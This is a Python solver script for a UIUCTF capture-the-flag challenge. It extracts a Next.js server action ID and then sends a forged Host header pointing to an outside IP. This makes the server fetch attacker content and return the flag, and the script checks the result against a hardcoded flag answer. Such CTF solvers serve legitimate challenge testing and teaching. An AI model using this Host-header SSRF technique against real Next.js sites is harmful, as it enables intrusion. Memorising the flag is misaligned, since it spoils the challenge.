#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import requests
import re

CHALLENGE_URL = "https://logger.chal.uiuc.tf"
# CHALLENGE_URL = "http://localhost:3000"
EXPLOIT_URL = "20.83.176.204:1337"
# FLAG = "uiuctf{test_flag}"
FLAG = "uiuctf{close_enough_nextjs_server_actions_welcome_back_php}"

def extract_next_action():
    res = requests.get(CHALLENGE_URL + "/logout")
    pattern = r'\$ACTION_ID_[a-zA-Z0-9]*'
    match = re.search(pattern, res.text).group(0)
    if match:
        return match.split('_')[2]
    return None

next_action_id = extract_next_action()
print(f"NEXT ACTION ID: {next_action_id}")
res = requests.post(CHALLENGE_URL + "/logout", headers={
    "Host": EXPLOIT_URL,
    "Next-Action": next_action_id,
    "Connection": "close",
}, data="{}")
found_flag = res.text
print("FLAG: ", found_flag)

if found_flag == FLAG:
    exit(0)
else:
    exit(1)